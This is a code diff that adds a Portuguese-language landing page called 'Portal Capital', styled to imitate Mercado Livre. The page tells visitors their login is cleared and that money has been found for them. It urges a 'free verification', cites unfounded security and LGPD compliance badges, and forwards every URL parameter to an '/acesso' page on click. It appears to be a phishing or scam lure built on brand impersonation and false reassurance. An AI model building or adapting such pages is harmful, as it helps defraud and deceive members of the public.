@@ -1,0 +1,431 @@
+
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Capital  </title>
+    <link rel="icon" type="image/png" href="../logo_smal.png">
+    
+</head>
+<body>
+    <!-- Header Device Info -->
+    <header class="ml-header">
+        <div class="ml-header-content">
+            <div class="device-info">
+                <div class="device-name" id="deviceName">Carregando...</div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="main-container">
+        <div class="ml-card">
+            <!-- Success Header -->
+            <div class="success-header">
+                <div class="success-icon"></div>
+                <h1 class="success-title">Login Liberado!</h1>
+                <p class="success-subtitle">Verificação de valores em andamento...</p>
+            </div>
+            
+            <!-- Card Content -->
+            <div class="card-content">
+                <div class="status-badge">
+                    Status: Liberado
+                </div>
+                
+                <p class="message-text">
+                    Tudo certo! Foi verificado a existencia de valores. 
+                    Clique e faça uma verificação gratuita.
+                </p>
+                
+                <a href="#" class="ml-button" id="abrirApp">
+                    <span>Verificação Online</span>
+                </a>
+                
+                <div class="security-info">
+                    <span>Conexão segura verificada. Esta verificação é gratuita. LGPD verificada e em conformes</span>
+                </div>
+            </div>
+        </div>
+        <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        
+        body { 
+            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #666666;
+        }
+        
+        /* Header Mercado Livre */
+        .ml-header {
+            background: #2865AE;
+            padding: 12px 0;
+            box-shadow: 0 1px 0 0 rgba(0,0,0,.1);
+        }
+        
+        .ml-header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .device-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .device-name {
+            font-size: 16px;
+            font-weight: 500;
+            color: #FFFFFF;
+        }
+        
+        /* Main Content */
+        .main-container {
+            max-width: 600px;
+            margin: 60px auto;
+            padding: 0 16px;
+        }
+        
+        /* Card Container */
+        .ml-card {
+            background: #FFFFFF;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px 0 rgba(0,0,0,.15);
+            border: 1px solid rgba(0,0,0,.1);
+            overflow: hidden;
+            animation: slideUp 0.6s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Success Header */
+        .success-header {
+            background: linear-gradient(135deg, #00a650 0%, #00bf63 100%);
+            padding: 32px 24px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .success-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: shimmer 3s ease-in-out infinite;
+        }
+        
+        @keyframes shimmer {
+            0%, 100% { transform: rotate(0deg); }
+            50% { transform: rotate(180deg); }
+        }
+        
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .success-icon::after {
+            content: '✓';
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+        }
+        
+        .success-title {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .success-subtitle {
+            color: rgba(255,255,255,0.9);
+            font-size: 16px;
+            font-weight: 400;
+            position: relative;
+            z-index: 2;
+        }
+        
+        /* Content */
+        .card-content {
+            padding: 32px 24px;
+            text-align: center;
+        }
+        
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #E8F5E8;
+            color: #00a650;
+            padding: 12px 20px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            border: 1px solid #C8E6C8;
+        }
+        
+        .status-badge::before {
+            content: '●';
+            font-size: 12px;
+            animation: blink 2s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+        
+        .message-text {
+            color: #666666;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+        
+        /* Button Mercado Livre Style */
+        .ml-button {
+            display: inline-block;
+            background: #2865AE;
+            color: white;
+            padding: 16px 32px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.2s ease;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 1px 2px 0 rgba(0,0,0,.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .ml-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .ml-button:hover {
+            background: #2865AE;
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px 0 rgba(52,131,250,.3);
+        }
+        
+        .ml-button:hover::before {
+            left: 100%;
+        }
+        
+        .ml-button:active {
+            transform: translateY(0);
+        }
+        
+        /* Loading state */
+        .ml-button.loading {
+            pointer-events: none;
+            background: #BFBFBF;
+        }
+        
+        .ml-button.loading::after {
+            content: '';
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            top: 50%;
+            left: 50%;
+            margin: -8px 0 0 -8px;
+            border: 2px solid white;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .ml-button.loading span {
+            opacity: 0;
+        }
+        
+        /* Footer */
+        .ml-footer {
+            text-align: center;
+            margin-top: 32px;
+            padding: 0 24px;
+        }
+        
+        .ml-footer-text {
+            color: #999999;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+        
+        .ml-link {
+            color: #2865AE;
+            text-decoration: none;
+        }
+        
+        .ml-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* Security Badge */
+        .security-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 16px;
+            color: #999999;
+            font-size: 12px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 600px) {
+            .main-container {
+                margin: 32px auto;
+                padding: 0 12px;
+            }
+            
+            .ml-header-content {
+                padding: 0 12px;
+            }
+            
+
+            
+                         .device-name {
+                 font-size: 14px;
+             }
+            
+            .success-header {
+                padding: 24px 20px;
+            }
+            
+            .success-title {
+                font-size: 20px;
+            }
+            
+            .success-subtitle {
+                font-size: 14px;
+            }
+            
+            .card-content {
+                padding: 24px 20px;
+            }
+            
+            .ml-button {
+                width: 100%;
+                padding: 14px 24px;
+            }
+            
+            .message-text {
+                font-size: 15px;
+            }
+        }
+    </style>
+        
+        <!-- Footer -->
+        <div class="ml-footer">
+            <p class="ml-footer-text">
+                Ao continuar, você concorda com nossos 
+                <a href="#" class="ml-link">Termos de Uso</a> e 
+                <a href="#" class="ml-link">Política de Privacidade</a>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const button = document.getElementById('abrirApp');
+            
+            
+            // Configurar URL do botão preservando parâmetros
+            function setupButtonUrl() {
+                try {
+                    const currentUrl = new URL(window.location.href);
+                    const params = currentUrl.searchParams;
+                    
+                    // Coletar todos os parâmetros da URL atual
+                    const allParams = [];
+                    
+                    // Preservar parâmetros importantes
+                    for (let [key, value] of params.entries()) {
+                        allParams.push(`${key}=${encodeURIComponent(value)}`);
+                    }
+                    
+                    // Construir URL para /quiz/
+                    let quizUrl = '/acesso';
+                    if (allParams.length > 0) {
+                        quizUrl += '?' + allParams.join('&');
+                    }
+                    
+                    button.href = quizUrl;
+                    
+                } catch (error) {
+                    console.error('Erro ao configurar URL:', error);
+                    button.href = '/acesso';
+                }
+            }
+            
+            // Configurar URL do botão
+            setupButtonUrl();
+            
+            // Adicionar efeito de loading ao clicar
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                // Adicionar estado de loading
+                button.classList.add('loading');
+                
+                // Redirecionar após pequeno delay para feedback visual
+                setTimeout(() => {
+                    window.location.href = button.href;
+                }, 600);
+            });
+        });
+    </script>
+</body>
+</html> 
